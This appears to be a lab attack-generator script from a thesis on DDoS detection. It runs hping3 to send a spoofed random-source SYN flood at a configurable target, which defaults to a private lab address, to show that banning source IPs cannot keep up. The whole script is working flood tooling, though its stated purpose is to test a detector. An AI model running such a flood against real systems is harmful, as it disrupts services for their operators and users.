#!/usr/bin/env bash
# Spoofed-source SYN flood -> DDoS family, with RANDOM source IPs per packet.
# This is the deliberate "where source-IP banning fails" demonstration: every packet
# appears to come from a new IP, so the ban list can never catch up. The detector
# still CLASSIFIES the flood correctly, but per-source banning is the wrong tool —
# motivating upstream/rate-based mitigation (discuss in the thesis).
# NOTE: spoofing only works inside the isolated lab; real networks filter it (BCP38).
set -euo pipefail
TARGET="${TARGET:-172.30.0.10}"
PORT="${PORT:-80}"
DURATION="${DURATION:-15}"

echo "[spoofed_flood] random-source SYN flood -> ${TARGET}:${PORT} for ${DURATION}s"
echo "[spoofed_flood] expect: classified as attack, but bans cannot keep up"
if [ "${DURATION}" -gt 0 ]; then
  timeout "${DURATION}" hping3 -S --flood --rand-source -p "${PORT}" "${TARGET}" || true
else
  hping3 -S --flood --rand-source -p "${PORT}" "${TARGET}"
fi
echo "[spoofed_flood] done"
